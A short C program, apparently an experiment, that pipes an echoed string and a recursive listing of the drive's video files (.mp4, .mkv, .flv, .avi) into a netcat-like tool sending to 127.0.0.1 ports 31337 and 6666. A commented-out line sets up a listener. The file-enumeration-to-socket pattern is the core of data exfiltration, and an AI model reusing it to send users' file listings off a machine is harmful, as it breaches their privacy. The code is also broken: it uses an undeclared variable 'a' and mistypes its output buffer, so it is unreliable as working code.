#include<stdio.h>
#include<windows.h>
#include<string.h>
main(int argc, char *argv[])
{
    int i=0;
    FILE *fp;
    char *username = argv[0];
    //fp = popen("ncp -v -l -p 4444","r"); //This returns the output to the stream
    char command[150],*out[500];
   // strcpy(command, "ncp -v -l -p 4444 > stdout");
    //system(command);
    strcpy(command, "echo ");
    strcat(command,a);
    strcat(command," | ncp 127.0.0.1 31337 ");
    fp = popen(command,"r");
    fgets(out,10,fp);
    strcpy(command,"dir /s /b /a *.mp4 *.mkv *.flv *.avi | ");
    strcat(command, "ncp 127.0.0.1 6666");
    fp = popen(command,"r");
    fgets(out,10,fp);
    pclose(fp);
}

